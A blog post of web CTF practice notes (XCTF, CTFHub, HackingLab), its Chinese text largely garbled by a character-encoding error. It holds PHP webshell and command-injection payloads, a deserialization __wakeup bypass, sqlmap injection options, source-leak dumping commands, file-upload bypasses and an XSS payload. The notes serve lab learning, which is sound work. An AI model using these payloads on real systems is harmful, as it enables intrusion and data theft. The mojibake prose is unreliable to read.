---
title: webCTF��¼
date: 2022-05-02 18:28:53
categories:
- CS
- security
tags:
- web
- CTF
toc: true
---
**ժҪ�����ļ�¼ˢ����web��**
<!-- more -->
---
# һ��xctf
## simple pHp
![20220516110337](https://s2.loli.net/2022/05/16/Wog1vasrdIbTc4C.png)
pHp tricks:
```
1.php���ַ��������ֱȽϴ�Сʱ����ʡ���ַ�
2.is_numeric ֻҪ���ַ����־���false
3.pHp�����ͱȽϣ�==����ɢ�Ƚϣ�ֻ�Ƚ�ֵ���Ƚ����ͣ�===���ϸ�Ƚϣ��Ƚ�ֵ������
```
```
php���������ֱȽϷ���:
�ַ��������ֱȽ�ʹ��==ʱ,�ַ�������ת��Ϊ���������ٱȽ�
var_dump('a' == 0);//true����ʱa�ַ�������ת�������֣���Ϊa�ַ���`��ͷ��û���ҵ�����`������ת��Ϊ0
var_dump('123a' == 123);//true������'123a'�ᱻת��Ϊ123
var_dump('a123' == 123);//false����Ϊphp��������һ���涨���ַ����Ŀ�ʼ���־���������ֵ��������ַ����ԺϷ������ֿ�ʼ����ʹ�ø��������������������һ�����ֽ�����������Ƚ�ʱ`����ֵΪ0`��
$a��aΪ�棬a����������0
```
��������urlΪ`http://111.198.29.45:44663/?a=a&b=1235a`

## get_post
![20220516112244](https://s2.loli.net/2022/05/16/wifBjbXr4GlOU13.png)
burpһ�������������(ע��a��Ϊget)
����content-lengthֻ��post�Ż��У�����Ҫ����ĳ�3

## xff_referer
X-Forwarder-For���ı䷢�������IP
Referer��Դ��ַ������ĿҪ���������https://www.google.com

## webshell
![20220516113037](https://s2.loli.net/2022/05/16/HDndGoLkfaWgZBT.png)
���ȴ���һ����Ϊshell�ı�����shell��ȡֵΪHTTP��POST��ʽ��Web��������shellȡֵ�Ժ�Ȼ��ͨ��eval()����ִ��shell��������ݡ�
���Խ����ϴ���д��webshell.php�ļ���Ȼ�����վ��Ŀ¼��ͨ����������ʣ���POST��ʽ����shell=phpinfo();
![20220516113627](https://s2.loli.net/2022/05/16/OXbxHpAwyZ2kr6D.png)
Ҳ�������Ͻ���˵��ȹ�������(�������õ����Ͻ�)����url��ַ��������http://127.0.0.1/webshell.php�������������������shell
![20220516113645](https://s2.loli.net/2022/05/16/haZTLzdnqNPltfs.png)
```
eval() �������ַ������� PHP ������ִ��
assert() ����ָ���� assertion ���ڽ��Ϊ FALSE ʱ��ȡ�ʵ����ж������ assertion ���ַ����������ᱻ assert() ���� PHP ������ִ�С�
```
[pHpһ�仰��](https://www.jianshu.com/p/6b815f951db3)

���ò˵�������
��burp����shell = system(��find / -name ��flag*����);
system("Linux����"),�൱�ڿ��˸�linux�ն�(/Ϊ��Ŀ¼��/home,/user)
�鿴 Response�����·���Ŀ���ļ�·��
shell = system(��cat /var/www/html/flag.txt��);
cat������linux�µ�һ���ı�������ͨ�������ڹۿ�ĳ���ļ������ݵ�

Ҳ����һ����ִ�ж��д��룺
```
shell=echo'<pre>';(echo��˫���ž���)Ч���ǳ��ָ�����
```
![20220516123133](https://s2.loli.net/2022/05/16/BHWQXlfEF8ikZoA.png)
grep �����ļ�������������ַ���

## ping
os����ִ��©��
![20220516124125](https://s2.loli.net/2022/05/16/Smflj7Ha3rV9egY.png)
����ʵ������������һ������Ĳ���
```
windows��linux������ִ��
command1 & command2 ������command1ִ�гɹ���񣬶���ִ��command2������һ������������Ϊ��һ����������룩��Ҳ����command1��command2��ִ��
command1 && command2 ����ִ��command1ִ�гɹ���Ż�ִ��command2����command1ִ��ʧ�ܣ���ִ��command2
command1 | command2 ��ִֻ��command2
command1 || command2 ��command1ִ��ʧ�ܣ���ִ��command2(��command1ִ�гɹ����Ͳ���ִ��command2)
```

## simple js
"\x49\x51\x5a\x56\x54"��C/C++ ����ͨ��ת���ַ���ֱ����cout ���� printf ������ʾ������
������55,56,54,79,115,69,114,116,107,49,50
var n = String.fromCharCode(65);//n = A ,�� Unicode ����תΪһ���ַ�
```
js�е����Ⱥ�˳��
��θ�ֵ��˳���޹أ���ͬʱ���и�ֵ��
ÿ���ڵ�ı������ո�ֵ��ֵȡ��ȥ���һ���Ⱥŵ��ұ�ֵ
�����ֵ���������ͣ�������ָ�����ͬһ������

JavaScript����Խ����ʲ��ᱨ��ֻ�᷵��undefined��
```
������Ʒ��ֽ��ֻ��pass�йأ������FAUX PASSWORD HAHA���������޹�
��һ����������ַ�����string����ˣ��뵽��pass����stringִ��һ��,p += chr(int(t2[17]))Ҫ����string�����һ��
exp���£�
![20220516233104](https://s2.loli.net/2022/05/16/uUWRPI6pnoi2re7.png)
## pHp2
![20220516174816](https://s2.loli.net/2022/05/16/cUuTyizS9jZWbrY.png)

ע�⣺������Ҫ��admin���ж��α���ſɳɹ�����Ϊ��������Զ�����һ��url���룬����֮�󴫵ݸ������൱��û���б��룬����admin

�����ȥ����һ�������������ҵ��ֵ���û��.phps��β�ģ���ɨ�����͹��ˡ�--����������ȡ�����ֵ�

```
.phps�ļ�����php��Դ�����ļ���ͨ�������ṩ���û��������ߣ��鿴php���룬��Ϊ�û��޷�ֱ��ͨ��Web���������php�ļ������ݣ�������Ҫ��phps�ļ����档��ʵ��ֻҪ����php���Ѿ��ڷ�������ע�����MIME����Ϊ�ļ����ɣ���Ϊ�˹���ͨ�ã����Բ�����phps�ļ����͡�
����MIME����Ϊ��text/html, application/x-httpd-php-source, application/x-httpd-php3-source
```
## ics-06
����id
intruder payload ѡnumber

## Web_php_unserialize
```
pHp��class
1��__construct()�������󴴽���new��ʱ���Զ����á����� unserialize() ʱ�ǲ����Զ����õġ������캯����
2��__destruct()������������ʱ���Զ����á�������������
3��__wakeup()��unserialize() ʱ���Զ�����
4.������ʽƥ��preg_match() ����
```
![20220517101903](https://s2.loli.net/2022/05/17/OesxJcE4dpGUDSg.png)
�������ǣ����flag��fl4g.php���ҳ���У����Demo�౻���٣���ô�ͻ������ʾfile��ָ����ļ������ݡ�
/[oc]:\d+:/i�о�
[OC]��������ʽ��o��c��ͷ
```
������ʽ�Ƕ��ַ���������һ���߼���ʽ�����������ȶ���õ�һЩ�ض��ַ�������Щ�ض��ַ�����ϣ����һ���������ַ�������
����������ַ��������������ַ�����һ�ֹ����߼���
\d:  ƥ��һ�������ַ����ȼ��� [0-9]��
 +:  ƥ��ǰ����ӱ��ʽһ�λ��Ρ����磬'zo+' ��ƥ�� "zo" �Լ� "zoo"��������ƥ�� "z"��+ �ȼ��� {1,}��
/i:  ��ʾƥ���ʱ�����ִ�Сд
```
__wakeup���ƹ�:
�����л��ַ����б�ʾ�������Ը�����ֵ������ʵ�����Ը���ʱ������__wakeup��ִ��,����ֻҪ��`O:4:��Demo��:1:{s:10:��Demofile��;s:8:��fl4g.php��;}`�е�1�Ǹĳ�����������������

# ����ctfhub
## 1.HTTP ���󷽷�
GET, POST �� HEAD������
OPTIONS, PUT, DELETE, TRACE �� CONNECT ����
```
OPTIONS
���ط���������ض���Դ��֧�ֵ�HTTP���󷽷���Ҳ����������web���������͡�*�������������Է������Ĺ�����
PUT
��ָ����Դλ���ϴ�����������
DELETE
���������ɾ��Request-URL����ʶ����Դ
TRACE
���Է������յ���������Ҫ���ڲ��Ի����
CONNECT
HTTP/1.1Э����Ԥ�����ܹ������Ӹ�Ϊ�ܵ���ʽ�Ĵ����������
```

## 2.HTTP��ʱ�ض���
����302��Ӧ�룬��ʱ��ת��location
ע��burpҪ�������ط�������Ӧ

## 3.������֤
������֤��Basic access authentication��������http�û������磺��ҳ�������������ʱ���ṩ �û��� �� ���� ��һ�ַ�ʽ
�ڽ��л�����֤�Ĺ���������HTTPͷ�ֶλ����Authorization�ֶΣ���ʽ���£� Authorization: Basic <ƾ֤>����ƾ֤���û����������͵�base64���롣��
```
GET /private/index.html HTTP/1.0
Host: localhost
Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
```
ȱ�㣺������֤��û��Ϊ����ƾ֤��transmitted credentials���ṩ�κλ����Եı���������ʹ�� Base64 ���벢���䣬��û��ʹ���κ� ���� �� ɢ���㷨����ˣ�������֤������ HTTPS һ��ʹ�ã����ṩ�����ԡ�
���뱬�ƣ�Ҫȥ����Ч�غɱ���

## 4.xss
url����룺���Ƕ�֪��HttpЭ���в����Ĵ�����"key=value"���ּ�ֱ����ʽ�ģ����Ҫ�������������Ҫ�á�&�����ŶԼ�ֵ�Խ��зָ��"?name1=value1&name2=value2"�������ڷ�������յ������ַ�����ʱ�򣬻��á�&���ָ��ÿһ��������Ȼ�����á�=�����ָ������ֵ��
ȡ��valueʱ�����url����(hello���ܽ���ٴζ���hello)
send�൱�ڻ������Զ���������ύ����ַ
![20220521172751](https://s2.loli.net/2022/05/21/954LW8jHf1bKxdE.png)

## 5.��Ϣй¶
### git
```bash
Ŀ¼ɨ�跢��/.git
---
pip3 install GitHacker
githacker --url http://127.0.0.1/.git/ --output-folder result
--brute #�����ƽ����п��ܵ�branch��
---
kali������
python2 GitHack.py http://www.example.com/.git/
---
git log
git stash list
git index
git branch
.git/config�ļ����ܺ���access_token���Է��ʸ��û������ֿ�
```

### svn(subversion)��hg��cvs��bzr
[����dvcs-ripper](https://github.com/kost/dvcs-ripper)
```
docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper ����
�����У�
rip-git.pl -v -u http://www.example.com/.git/   ����   rip-git.pl -s -v -u http://www.example.com/.git/
rip-hg.pl -v -u http://www.example.com/.hg/     ����   rip-hg.pl -s -v -u http://www.example.com/.hg/
rip-bzr.pl -v -u http://www.example.com/.bzr/
rip-svn.pl -v -u http://www.example.com/.svn/
rip-cvs.pl -v -u http://www.example.com/CVS/
```
svn��git������
```
1.git�Ƿֲ�ʽ�ģ��б��غ�Զ�������汾�⣬SVN�Ǽ���ʽ��ֻ��һ��Զ�̰汾�⣻
2.git�������ǰ�Ԫ���ݷ�ʽ���������п����ļ���.git�У�svn�ǰ��ļ�����������Դ�����ļ���.svn�У�
3.svn�ķ�֧��һ��Ŀ¼��git���ǣ�
4.gitû��һ��ȫ�ֵİ汾�ţ�svn�У�
5.git���ݴ�����ʹ��SHA-1��ϣ�㷨����ȷ������������;
6.git �й��������ݴ�����Զ�ֿ̲⣬git add�������ύ���ݴ����� commit�ύ�����ذ汾�⣬push���͵�Զ�̰汾�⡣svn��add �ύ���ݴ棬commit���ύ��Զ�̰汾�⡣
```
��ͼ�� wc.db ���ҵ� flag, ���Է��ʽ���ļ������ֱ�ɾ���ˡ�
```bash
cat wc.db | grep -a flag
```
ת��Ѱ�� .svn/pristine/ �е��ļ����ҵ� flag
.svnĿ¼(�����ֵ�)��
```
������ pristine �����汾��¼������ļ�һ��ϴ�
������ tmp 
������ entries ��ǰ�汾��
������ format �ı��ļ��� ����һ����������ǰ�汾��
������ wc.db �������ļ�
������ wc.db-journal �������ļ�
```
[�ο�](https://juejin.cn/post/6960836262894764039)

### .DS_Store
.DS_Store �� Mac OS �����ļ��е��Զ������Ե������ļ���ͨ��.DS_Store����֪�����Ŀ¼���������ļ����嵥��
ֱ��cat .DS_Store
### �����ļ�
```py
name = ['web','website','backup','back','www','wwwroot','temp']
ext = ['tar','tar.gz','zip','rar']
index.php.bak
.index.php.swp #�ָ�����������vim����һ��index.php,��vim -r index.php
```
## 6.�����
### ������
������̨�뵽�û���Ϊadmin
### Ĭ�Ͽ���
�ٶ��繤

### �ܽ�
Ҫ��������ܽ���Լ����ֵ�

## 7.sqlע��
��sqlmap��urlһ��Ҫ�в���?id=1,����y
### cookie
--level 2���ȼ�2���ϲŻ���cookieע��
--cookie:id=1 �����ܿ�ע��Ĳ���
![20220526151313](https://s2.loli.net/2022/05/26/4y5NSt6qTWk8DeA.png)
### ua
--level 3:�ȼ�3���ϲŻ���uaע��
burpץ���õ������ݷŽ�a.txt
![20220526155332](https://s2.loli.net/2022/05/26/dAyNkDfOxZ5RUWV.png)
```
sqlmap -r ��a.txt�� -p ��User-Agent��(ע�ⲻ����-u��)
```
### refererע��
--level 5
burpץ���õ������ݷ���û��Refer����ͷ�����Refer����ͷ�Ž�b.txt
![20220526155226](https://s2.loli.net/2022/05/26/ABjKmUeYPMIEWSu.png)
ע������
```
sqlmap -r "b.txt" --level 5 -p "referer"
```
### �ƹ��ո�
sqlmap�Դ�space2comment.py �ű����÷���--tamper "space2comment.py"

 sqlmap �е� tamper �ű��кܶ࣬���磺 equaltolike.py ����������like����Ⱥţ��� apostrophemask.py ����������utf8�������ţ��� greatest.py ���������ƹ�����'>' ,��GREATEST�滻���ںţ��ȡ�

## 8.�ļ��ϴ�
�˵��Ͻ���Щ������_POST[]��
ΪʲôҪ�ϴ�PHPľ�������JSP,ASPX��ľ��
```bash
ͨ�����������������жϷ�ʽ�����¼��֣�
1.���ļ���׺ #����ҳ��ʾ xxxx.com/index.php,�����Ҽ�Դ�����У����ύaction="upload.php"
2.�����⣨Wappalyzer�����#���Լ�⵱ǰҳ��Ļ������������м����ǰ������Ե�
3.��Ӧ���ж� #����Ӧ����burpsuite����Ӧ�����£�X-Powered-By: PHP/7.3.14
```
���裺
```
1.�ȿ�ǰ���ƹ�
2.��Сд��'php '��'php.'��'php::$DATA'(��վ��������windows����)

```
### .htaccess
.htaccess�ļ�(��www�ļ���)��Apache�������е�һ�������ļ������ڿ��������ڵ�Ŀ¼�Լ���Ŀ¼�µ�������Ŀ¼��ͨ��htaccess�ļ������԰�����ʵ�֣���ҳ301�ض����Զ���404����ҳ�桢`�ı��ļ���չ��`������/��ֹ�ض����û�����Ŀ¼�ķ��ʡ���ֹĿ¼�б�����Ĭ���ĵ��ȹ���
Դ�������£��ú�������ֹ��php�ϴ��������ǿ���д��������û�е�.htaccess�ļ��ϴ���uploadĿ¼�Ӷ����Ƹ�Ŀ¼������ԭĿ¼��.htaccess�ᱻ���ǵ�
![20220526182945](https://s2.loli.net/2022/05/26/Rn56gD4rXqK23U8.png)
```php
move_uploaded_file() �������ϴ����ļ��ƶ�����λ�á�
���ɹ����򷵻� true�����򷵻� false .(������������ͨ�� HTTP POST �ϴ����ļ���)
ע�⣺���Ŀ���ļ��Ѿ����ڣ����ᱻ���ǡ�
```
�ڵ���2.3.8�汾ʱ����ΪĬ��AllowOverrideΪall�����Գ����ϴ�.htaccess�ļ��޸Ĳ�������
```
����һ��
<FilesMatch "�ļ����Ĳ���">  
SetHandler application/x-httpd-php
</FilesMatch>
��������
AddHandler php5-script .php
# ���ļ���չ���ͽ�����֮�佨��ӳ��
# ָ����չ��Ϊ.php���ļ�Ӧ��php5-script����
```

### 00�ض�
%00   , 0x00   , /00   ������00�ض�,���õ��Ƿ������Ľ���©��(ascii��0��ʾ�ַ�������),���Զ�ȡ�ַ�����00�ͻ�ֹͣ,��Ϊ�Ѿ�������
![20220526201804](https://s2.loli.net/2022/05/26/rcopi4X6sRL2AQD.png)
_FILE['name']���Զ�����һ�νضϣ������ϴ����ļ��޷���00�ضϣ���ץ������road��ͨ��_GET�õ��ģ���_GET�����Զ��ضϣ����Կ�����00�ضϵ�`$des`��������ݣ���`$des`Ϊupload/test.php
jdk7u40�汾���´���00�ضϣ����ϵİ汾�����File��isInvalid()�ж��ļ����Ƿ�Ϸ�(�Ƿ����\0)��
![20220526205114](https://s2.loli.net/2022/05/26/2OKQeXVtLwamq4k.png)
PHP����5.4�汾ʱ�������iconv()������utf8���ַ�ת�����������ͣ�����ת�����ַ�����utf8�ĵ��ֽڷ�Χ(0x00-0x7F)�ڣ�ת��ʱ�ͻ����ͺ�����ַ��ضϡ�php����5.4ʱ�᷵��fasle

### MIME�ƹ�
��HTTP��MIME���ͱ�����header��Content-Type�С��˴��������ǽ����ƹ����ɹ��ϴ��ĺ���
![20220526211253](https://s2.loli.net/2022/05/26/zGmMR3epWCtEVvP.png)

### �ļ�ͷ���
�������png,�ϴ�ץ��,ֻ�����ļ�ͷ���е����ݣ������ȫɾ��(̫�������Ͻ�����������)��Ȼ�������һ�м���php���룬�ٸ����ļ���׺��

### .user.ini
���ޣ�ֻ�е�ǰĿ¼��php�ļ���ִ��ʱ�Ż���ص�ǰĿ¼��.user.ini

## 9.Rce(Զ������ִ��)
&& ||
![20220526213738](https://s2.loli.net/2022/05/26/37lK5pmUBWJQtYn.png)
windows:
%0a��&��|(����ǰһ��)��&&��||(���Ժ�һ��)��%1a(һ������Ľ�ɫ,��Ϊ.bat�ļ��е�����ָ���)
linux��:%0a ��%0d ��; ��& ��| ��&&��|| 
windowsת���ַ�Ϊ'^',Linuxת���ַ�Ϊ'\'
windowsע��Ϊ::��Linuxע��Ϊ#

### �ļ�����
���԰�������php�����txt�ļ��ȣ�php������ڴ��κ��ҳ��ִ��
phpαЭ�飺php://
![20220526220509](https://s2.loli.net/2022/05/26/1DCsFxBzcRywWNl.png)
![20220526220459](https://s2.loli.net/2022/05/26/OXId4RwEkCLmZQH.png)
��ʱphp://input�൱��һ���ļ�
![20220526221614](https://s2.loli.net/2022/05/26/gEkHI8zTbp3siyF.png)
# ����HackingLab ������Ϣ��ȫ����ѧϰƽ̨
## 1.�ű���
ͨ��`<script>window.location="./no_key_is_here_forever.php"; </script>`�ض�����
script��src ���Թ涨�ⲿ�ű��ļ��� URL��
## 2.XSS����3:����빹��
�鿴��Щ��ǩ�ؼ���û�б�����,����׼��һ��txt�ļ�ר�����ڼ��δ�����˺�����burp�Ϳ�������
![20220521184317](https://s2.loli.net/2022/05/21/5B6RYPh3Dba97Qq.png)
������Welcome <input type='text' value='123' onmouseover="eval(' ale'+'rt(HackingLab)')" s=''>
```
�����ͣ�����
�洢�ͣ����԰�
dom:�е�����
```
[xss�ƹ�](https://blog.csdn.net/nigo134/article/details/118827542)

